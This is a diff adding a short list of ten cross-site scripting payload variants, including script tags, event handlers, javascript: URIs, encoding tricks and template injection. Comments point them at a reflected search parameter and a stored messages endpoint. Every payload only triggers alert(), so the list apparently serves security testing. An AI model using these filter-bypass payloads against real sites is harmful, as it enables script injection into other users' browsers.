@@ -1,0 +1,33 @@
+# XSS Payload Variants
+# Each line is a distinct bypass technique.
+# Test against /search?q=<payload> (reflected) or POST /messages (stored).
+
+# 1. Classic script tag
+<script>alert(1)</script>
+
+# 2. Script tag with mixed case (case-insensitive bypass)
+<ScRiPt>alert(2)</ScRiPt>
+
+# 3. img onerror event handler
+<img src=x onerror=alert(3)>
+
+# 4. SVG onload
+<svg onload=alert(4)>
+
+# 5. javascript: URI in anchor
+<a href="javascript:alert(5)">click</a>
+
+# 6. iframe srcdoc
+<iframe srcdoc="<script>alert(6)</script>"></iframe>
+
+# 7. HTML entity obfuscation (&#x3C; = <)
+&#x3C;script&#x3E;alert(7)&#x3C;/script&#x3E;
+
+# 8. Event handler without quotes
+<div onmouseover=alert(8)>hover me</div>
+
+# 9. Double-encoded payload (%253C = %3C = <)
+%253Cscript%253Ealert(9)%253C/script%253E
+
+# 10. Template injection style (for frameworks that eval)
+{{constructor.constructor('alert(10)')()}}
